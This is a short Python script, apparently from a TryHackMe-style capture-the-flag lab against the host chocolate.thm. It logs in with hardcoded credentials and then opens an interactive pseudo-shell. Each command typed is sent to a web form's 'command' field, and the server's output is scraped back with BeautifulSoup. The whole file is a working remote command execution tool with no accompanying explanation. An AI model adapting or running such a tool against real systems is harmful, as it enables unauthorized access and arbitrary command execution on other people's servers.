#!/usr/bin/env python3

import sys
import requests as req
from urllib3 import disable_warnings

from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory

from bs4 import BeautifulSoup

disable_warnings()

def session_stream():
    try:

        s = req.Session()

        data = {
            "uname": "charlie",
            "password": "cn7824"
        }

        _post = s.post(
            'http://chocolate.thm/validate.php',
            data=data
        )

        if _post.status_code == 200:
            return s
    except req.exceptions.RequestException as e:
        print(f'\n\t\033[1;31m[x] Error:\033[0m {e}')
        print(f'\n\033[1;33m[!]\033[0m Por favor, revisa que la url que estás pasando sea correcta')
        sys.exit(1)

def main():

    try:
        session = session_stream()

        prompt = PromptSession(history=InMemoryHistory())

        while True:
            shell = prompt.prompt(
                HTML("<skyblue> > </skyblue>"),
                auto_suggest=AutoSuggestFromHistory()
            )
            shell = shell.strip()

            post = session.post(
                'http://chocolate.thm/home.php',
                data={"command": shell}
            )
            soup = BeautifulSoup(post.text, 'html.parser')
            div = soup.find('div', class_='cmd')
            div.find('form').decompose()
            print(div.get_text().strip())


    except KeyboardInterrupt:
        sys.exit()

if __name__ == '__main__':
    main()